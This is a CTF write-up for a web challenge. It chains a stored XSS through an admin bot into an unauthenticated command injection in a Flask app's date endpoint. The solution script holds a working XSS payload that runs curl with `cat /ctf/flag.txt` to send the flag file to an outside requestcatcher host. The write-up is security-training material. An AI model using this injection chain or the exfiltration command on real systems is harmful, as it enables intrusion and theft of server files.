# Not-a-problem ~ Web

## Description

<blockquote>
Bug bounty hunter: "There's command injection here"

Triager: "But it's only accessible by admins so it's nOt A vUlNeRaBiLiTy"

You: bet

Server - https://not-a-problem.chal.cyberjousting.com/

Admin bot - https://not-a-problem-admin.chal.cyberjousting.com/

Author:Legoclones

Note: For all web challenges, for reasons unknown to mankind, calls back to webhook.site(and perhaps others) are not working so try to use something like https://requestcatcher.com/ (which is confirmed to work)
</blockquote>

## Analysis

<p> In this challenge we are given the source code of server and admin bot. That last part of the description came way later (webhook.site - reference) which made me waste a lot of time...
</p>

server.py

```from flask import Flask, request
import uuid, subprocess


# initialize flask
app = Flask(__name__)
SECRET = open("secret.txt", "r").read()
stats = []


# index
@app.route('/', methods=['GET'])
def main():
    return 'Bro did you really think I care about the front end enough to make one?'


# get stats
@app.route('/api/stats/<string:id>', methods=['GET'])
def get_stats(id):
    for stat in stats:
        if stat['id'] == id:
            return str(stat['data'])
        
    return '{"error": "Not found"}'


# add stats
@app.route('/api/stats', methods=['POST'])
def add_stats():
    try:
        username = request.json['username']
        high_score = int(request.json['high_score'])
    except:
        return '{"error": "Invalid request"}'
    
    id = str(uuid.uuid4())

    stats.append({
        'id': id,
        'data': [username, high_score]
    })
    return '{"success": "Added", "id": "'+id+'"}'


# current date
@app.route('/api/date', methods=['GET'])
def get_date():
    # get "secret" cookie
    cookie = request.cookies.get('secret')

    # check if cookie exists
    if cookie == None:
        return '{"error": "Unauthorized"}'
    
    # check if cookie is valid
    if cookie != SECRET:
        return '{"error": "Unauthorized"}'
    
    modifier = request.args.get('modifier','')
    
    return '{"date": "'+subprocess.getoutput("date "+modifier)+'"}'


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337, threaded=True)
```

admin_bot.js

```const express = require('express');
const puppeteer = require('puppeteer');
const escape = require('escape-html');
const fs = require('fs');

const app = express()
app.use(express.urlencoded({ extended: true }));

const SECRET = fs.readFileSync('secret.txt', 'utf8').trim()
const CHAL_URL = 'http://127.0.0.1:1337/'

// go to the page specified by the path, using a secret session cookie
const visitUrl = async (url) => {

    let browser =
            await puppeteer.launch({
                headless: "new",
                pipe: true,
                dumpio: true,

                // headless chrome in docker is not a picnic
                args: [
                    '--no-sandbox',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-dev-shm-usage',
                    '--disable-setuid-sandbox',
                    '--js-flags=--noexpose_wasm,--jitless'
                ]
            })

    try {
        const page = await browser.newPage()

        try {
            await page.setUserAgent('puppeteer');
            let cookies = [{
                name: 'secret',
                value: SECRET,
                domain: '127.0.0.1',
                httpOnly: true
            }]
            await page.setCookie(...cookies)
            await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' })
        } finally {
            await page.close()
        }
    }
    finally {
        browser.close()
        return
    }
}
...
...
```
Taking a look at the server.py we can see that there is an XSS vulnerability at the `/api/stats/<string:id>'` endpoint that is returning data to the client, from object property `data` as `str(stat['data']`. So we can upload our payload through `/api/stats` endpoint as POST request which basically takes json object with properties: `username` and `high_score`- that are part of the object that will get appended to the global list `stat`. On success it will return us `id` which is `uuid` of the note that we can pass to the bot to visit and where our XSS will trigger. 
Another vector is in `api/date` endpoint:

```
    modifier = request.args.get('modifier','')
    
    return '{"date": "'+subprocess.getoutput("date "+modifier)+'"}'
``` 
We can see that we could do a command injection through `modifier` argument since it is directly used without any sanitization in `subprocess` call. 

## Solution

Since I wasted a lot of time before they announced that bot would not visit webhook.site , teammate (Shafou) took over with part of the script and tried with request.catcher as it was provided as service that will work for exfiltration. 

```python
import requests, subprocess

API = 'https://not-a-problem.chal.cyberjousting.com'
# API = 'http://localhost:40001'
BOT = 'https://not-a-problem-admin.chal.cyberjousting.com'
# BOT = 'http://localhost:40002'

a = """
<script>
(() => { 
    fetch('http://127.0.0.1:1337/api/date?modifier=;curl+https://lalal.requestcatcher.com/13`cat /ctf/flag.txt`', {'mode':'no-cors'})
})()
</script>""".replace('\n','')

# a = """
# <iframe src="http://localhost:1337/api/date?modifier=ls"></iframe>
# """.replace('\n','')

def create_xss():
    payload = {"username": a, "high_score": 12}

    res = requests.post(API + '/api/stats', json=payload)
    id = res.json()["id"]
    return id

def visit(id):
    res = requests.post(BOT + '/visit', data={'path':f'api/stats/{id}'})
    print(f"DEBUGPRINT[4]: lab.py:14: res.text={res.text}")

id = create_xss()
print(f"{API}/api/stats/{id}")

import time
start = time.time()
visit(id)
end = time.time()
bench = end - start
print(f"DEBUGPRINT[12]: lab.py:39: bench={bench}")
```

And it got us a flag:

<b>GET /byuctf"not_a_problem"_YEAH_RIGHT HTTP/1.1</b>

<b>Author: [hebi](github.com/0xhebi) </b>